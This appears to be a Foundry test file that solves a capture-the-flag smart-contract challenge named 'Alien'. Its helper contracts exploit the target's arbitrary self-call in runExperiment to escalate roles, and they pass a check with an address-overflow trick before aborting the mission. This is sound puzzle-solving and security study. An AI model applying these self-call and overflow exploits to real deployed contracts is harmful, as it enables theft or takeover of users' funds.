// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/alien/src/alien.sol";

contract AlientTest is Test {
    Alien alien;

    function setUp() public {
        bytes memory code =
            hex"608060405234801561001057600080fd5b506004361061012c5760003560e01c8063a15184c7116100ad578063e7511d8d11610071578063e7511d8d146102aa578063ea93bc96146102bc578063f680a7cd146102cf578063f705b2e2146102d8578063fcd82757146102e157600080fd5b8063a15184c71461025d578063ace423ca14610270578063ccc674f614610278578063d98b3eb41461028d578063e42c7669146102a257600080fd5b80636f445300116100f45780636f445300146101cb5780637235a6d5146101de5780638c0ff94b146101e657806399374642146101f9578063995280321461024857600080fd5b806309218e9114610131578063183aa328146101635780634851375c146101835780634e85c36e146101995780635166bff7146101ae575b600080fd5b60035460045460055461014392919083565b604080519384526020840192909252908201526060015b60405180910390f35b6101766101713660046110ec565b6102f6565b60405161015a9190611118565b61018b6104d5565b60405190815260200161015a565b6101ac6101a7366004611167565b6104f1565b005b6001546101bb9060ff1681565b604051901515815260200161015a565b6101ac6101d9366004611180565b61063a565b6101ac6106fa565b6101ac6101f4366004611167565b6108f9565b61022b610207366004611180565b60006020819052908152604090208054600182015460029092015490919060ff1683565b60408051938452602084019290925215159082015260600161015a565b61018b60008051602061136583398151915281565b6101ac61026b366004611167565b610b2f565b6101ac610e24565b61018b60008051602061132583398151915281565b61018b60008051602061134583398151915281565b6101ac610edc565b6001546101bb90610100900460ff1681565b6101ac6102ca3660046111b0565b610f9c565b61018b60025481565b61018b60065481565b61018b60008051602061138583398151915281565b336000908152602081905260409020546060906000805160206113458339815191529081146103405760405162461bcd60e51b815260040161033790611222565b60405180910390fd5b60015460ff16610380576040518060400160405280601681526020017515dbdc9b5a1bdb195cc8185c9948191a5cd8589b195960521b81525091506104cd565b683635c9adc5dea00000600654106103b2576040518060600160405280603581526020016112f06035913991506104cd565b69152d02c7e14af68000006103c8868686611084565b116103ed576040518060600160405280603981526020016113a56039913991506104cd565b600385905560048490556005839055604080518681526020810186905290810184905233907fa0a5c9040ba611f74e82c058673373f59bb2fed8a32a44537ebeefe75d58c4789060600160405180910390a260065461044d81600261125e565b600681905560405133917f47d80da589b78424bfd7d9fed5ed5ffc1ba8ef667015e9400ab5b7b5db2afec29161048b91858252602082015260400190565b60405180910390a26040518060400160405280601f81526020017f596f7527766520616c6d6f737420736f6c76656420746865206c6576656c21008152509250505b509392505050565b6003546004546005546000926104ec929091611084565b905090565b3360009081526020819052604090205460008051602061136583398151915290811461052f5760405162461bcd60e51b815260040161033790611222565b60065482111561058b5760405162461bcd60e51b815260206004820152602160248201527f43616e6e6f742064756d70206d6f7265207468616e20776861742065786973746044820152607360f81b6064820152608401610337565b600654600061059a8483611275565b9050681b1ae4d6e2ef50000081116105f45760405162461bcd60e51b815260206004820152601d60248201527f4e65656420746f206b65657020736f6d6520666f6f642061726f756e640000006044820152606401610337565b6006819055604080518381526020810183905233917f47d80da589b78424bfd7d9fed5ed5ffc1ba8ef667015e9400ab5b7b5db2afec2910160405180910390a250505050565b336000908152602081905260409020546000805160206113458339815191529081146106785760405162461bcd60e51b815260040161033790611222565b603361068433846110bd565b1461068e57600080fd5b6002546001016002556a2a2fab8a32d3571300000060038190556004819055600581905560408051828152602081018390529081019190915233907fa0a5c9040ba611f74e82c058673373f59bb2fed8a32a44537ebeefe75d58c4789060600160405180910390a25050565b336000908152602081905260409020546000805160206113458339815191529081146107385760405162461bcd60e51b815260040161033790611222565b69d3c21bcecceda100000061074b6104d5565b106107a75760405162461bcd60e51b815260206004820152602660248201527f4d7573742062652077697468696e20313030306b6d20746f2061626f7274206d60448201526534b9b9b4b7b760d11b6064820152608401610337565b683635c9adc5dea00000600654106108195760405162461bcd60e51b815260206004820152602f60248201527f4d757374206265207765696768206c657373207468616e20313030306b67207460448201526e379030b137b93a1036b4b9b9b4b7b760891b6064820152608401610337565b6000600254116108915760405162461bcd60e51b815260206004820152603f60248201527f4d757374207669736974204172656120353120616e642073636172652074686560448201527f2068756d616e73206265666f72652061626f7274696e67206d697373696f6e006064820152608401610337565b7f3a2db9fe7908dcc36d81824d2338fc3f1aff49ac357dd8c4840527fba27a5b90333f016108be57600080fd5b6001805461ff0019166101001790556040517f36ecdc9a6fcd7296bb9e8ba1d0346958e5dc548c84186d854d2c4e65691ceed690600090a150565b80600080516020611385833981519152811480610923575060008051602061136583398151915281145b8061093b575060008051602061134583398151915281145b80610953575060008051602061132583398151915281145b61096f5760405162461bcd60e51b815260040161033790611222565b600080516020611345833981519152821480156109a8575033600090815260208190526040902054600080516020611385833981519152145b15610ae7573360009081526020819052604090206001015442906109cd90600c611288565b1115610a5e5760405162461bcd60e51b815260206004820152605460248201527f596f75206d75737420686f6c64206120706f736974696f6e20666f722061742060448201527f6c65617374203132207365636f6e6473206265666f7265206265696e6720656c60648201527334b3b4b13632903337b910383937b6b7ba34b7b760611b608482015260a401610337565b3360009081526020819052604090206002015460ff16610a7d57600080fd5b3360008181526020819052604080822060008051602061134583398151915280825542600190920191909155905190926000805160206113858339815191529290917ffcfb5e407c67edddc9427bb960d67da62f80c86d3e0176134be84d0c0298cc519190a45050565b60405162461bcd60e51b815260206004820152601760248201527f50726f6d6f74696f6e206e6f7420617661696c61626c650000000000000000006044820152606401610337565b80600080516020611385833981519152811480610b59575060008051602061136583398151915281145b80610b71575060008051602061134583398151915281145b80610b89575060008051602061132583398151915281145b610ba55760405162461bcd60e51b815260040161033790611222565b3360009081526020819052604090205480610dc1576000805160206113658339815191528303610c2857336000818152602081905260408082206000805160206113658339815191528082554260019092019190915590519092917fd7b59a7335373cd670f56aaac22cb24e2d3b6efaa5f7eef93ae4d79b2d4f3ec291a3505050565b60008051602061138583398151915283148015610c61575030600090815260208190526040902054600080516020611365833981519152145b15610cbf57336000818152602081905260408082206000805160206113858339815191528082554260019092019190915590519092917fd7b59a7335373cd670f56aaac22cb24e2d3b6efaa5f7eef93ae4d79b2d4f3ec291a3505050565b6000805160206113258339815191528303610d845760405162461bcd60e51b815260206004820152607360248201527f5468657265206973206e6f20626c6f636b636861696e2073656375726974792060448201527f7265736561726368657220706f736974696f6e206f6e2074686520737061636560648201527f73686970206275742077652776652068656172642074686174204f70656e5a656084820152727070656c696e20697320686972696e67203a2960681b60a482015260c401610337565b60405162461bcd60e51b8152602060048201526012602482015271526f6c65206973206e6f7420686972696e6760701b6044820152606401610337565b60405162461bcd60e51b815260206004820152603260248201527f55736520746865206170706c79466f7250726f6d6f74696f6e2066756e6374696044820152711bdb881d1bc819d95d081c1c9bdb5bdd195960721b6064820152608401610337565b3360009081526020819052604090205480610e8d5760405162461bcd60e51b815260206004820152602360248201527f43616e6e6f74207175697420696620796f7520646f6e277420686176652061206044820152623537b160e91b6064820152608401610337565b3360008181526020819052604080822082815560018101839055600201805460ff19169055518392917f37def82fce4fdcf8b69f22b7cb4e179b2080e5bca996893e2966b95f0cb49d9c91a350565b33600090815260208190526040902054600080516020611385833981519152908114610f1a5760405162461bcd60e51b815260040161033790611222565b333f7fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a47014610f4757600080fd5b6001805460ff199081168217825533600090815260208190526040808220600201805490931690931790915590517f969eb872d3dc2b2e390cb79ccd3453c92553d561b80b34b24a54a8e70397bcb29190a150565b33600090815260208190526040902054600080516020611365833981519152908114610fda5760405162461bcd60e51b815260040161033790611222565b6000306001600160a01b03168484604051610ff692919061129b565b6000604051808303816000865af19150503d8060008114611033576040519150601f19603f3d011682016040523d82523d6000602084013e611038565b606091505b505090508061107e5760405162461bcd60e51b81526020600482015260126024820152714578706572696d656e74206661696c65642160701b6044820152606401610337565b50505050565b600061108f826110d0565b611098846110d0565b6110a1866110d0565b6110ab91906112ab565b6110b591906112ab565b949350505050565b6001600160a01b03828201165b92915050565b6000808212156110e8576110e3826112d3565b6110ca565b5090565b60008060006060848603121561110157600080fd5b505081359360208301359350604090920135919050565b60006020808352835180602085015260005b818110156111465785810183015185820160400152820161112a565b506000604082860101526040601f19601f8301168501019250505092915050565b60006020828403121561117957600080fd5b5035919050565b60006020828403121561119257600080fd5b81356001600160a01b03811681146111a957600080fd5b9392505050565b600080602083850312156111c357600080fd5b823567ffffffffffffffff808211156111db57600080fd5b818501915085601f8301126111ef57600080fd5b8135818111156111fe57600080fd5b86602082850101111561121057600080fd5b60209290920196919550909350505050565b6020808252600c908201526b496e76616c696420726f6c6560a01b604082015260600190565b634e487b7160e01b600052601160045260246000fd5b80820281158282048414176110ca576110ca611248565b818103818111156110ca576110ca611248565b808201808211156110ca576110ca611248565b8183823760009101908152919050565b80820182811260008312801582168215821617156112cb576112cb611248565b505092915050565b6000600160ff1b82016112e8576112e8611248565b506000039056fe4d757374207765696768206c657373207468616e20312c3030306b6720746f206a756d70207468726f75676820776f726d686f6c65720a004d39b816addddcfa184666132ae9e307670a4e534d64e0af23c84ee0e13a1665efe60dbe93a7cdcf728baddc0d7ebafe407d444d0de3ed20e1e52a6a0d56a2da3687a5982774df44639b06a410da311ff14844c2f7ff0cab50d681571cb5b6b705a01c9fbc2f5b52325436afd32f5988596d999716ad1711063539b56443616e6e6f742067657420636c6f736572207468616e203130306b6d206f722074686520656e656d792077696c6c2064657465637420757321a26469706673582212204b25c5de341137a54b1c88626b0f76a9eacde50f4d87b695b97271b772b7bc0964736f6c63430008180033";
        address targetAddr = makeAddr("target");
        vm.etch(targetAddr, code);
        alien = Alien(targetAddr);
    }

    function _testSolveAlien() public {
        bytes32 captain_role = alien.CAPTAIN();
        bytes32 engineer_role = alien.ENGINEER();
        bytes32 blockchain_security_researcher_role = alien.BLOCKCHAIN_SECURITY_RESEARCHER();
        bytes32 physicist_role = alien.PHYSICIST();

        // console.logBytes32(captain_role);
        // console.logBytes32(engineer_role);
        // console.logBytes32(blockchain_security_researcher_role);
        // console.logBytes32(physicist_role);

        Engineer engineer = new Engineer(address(alien));
        Physicist physicist = new Physicist(address(alien));
        console.log("engineer address: ", address(engineer));
        console.log("physicist address: ", address(physicist));

        alien.applyForJob(engineer_role);

        console.log("is wormhole enabled: ", alien.wormholesEnabled());

        skip(100);

        physicist.applyForCaptainPromotion();

        physicist.ExploitRole();

        console.log("is mission aborted:", alien.missionAborted());
    }
}

contract Engineer {
    Alien alien;

    constructor(address _alien) {
        alien = Alien(_alien);
        alien.applyForJob(alien.ENGINEER());
        bytes memory payload = abi.encodePacked(abi.encodeWithSignature("applyForJob(bytes32)", alien.ENGINEER()));

        alien.runExperiment(payload);
    }
}

contract Physicist {
    Alien alien;

    constructor(address _alien) {
        alien = Alien(_alien);
        alien.applyForJob(alien.PHYSICIST());
        alien.enableWormholes();
    }

    function applyForCaptainPromotion() public {
        alien.applyForPromotion(alien.CAPTAIN());
    }

    function abortMission() public {
        alien.abortMission();
    }

    function jumpThroughWormhole(uint256 x, uint256 y, uint256 z) public {
        string memory result = alien.jumpThroughWormhole(int256(x), int256(y), int256(z)); // <1e24
        console.log(result);
        console.logInt(alien.distance()); //1.53e26
    }

    function ExploitRole() public {
        console.logInt(alien.distance()); // 0
        visitArea51();
        console.logInt(alien.distance());
        string memory result = alien.jumpThroughWormhole(1e23, 1, 1); // <1e24
        console.log(result);
        console.log("payload mass: ", alien.payloadMass());
        //1000000000000000000000000
        //6000000000000000000000000
        console.log("1e24: ", 1e24);
        console.logInt(alien.distance()); //1.53e26

        alien.abortMission();
    }

    function visitArea51() public {
        uint160 myAddress = uint160(address(this));
        uint160 arg = type(uint160).max - myAddress + 52;
        uint160 result;

        assembly {
            result := add(myAddress, arg)
        }
        // we need overflow this address value so final result is 51;
        address target = address(arg);
        alien.visitArea51(target);
    } //5100000e18 = 51e23
}
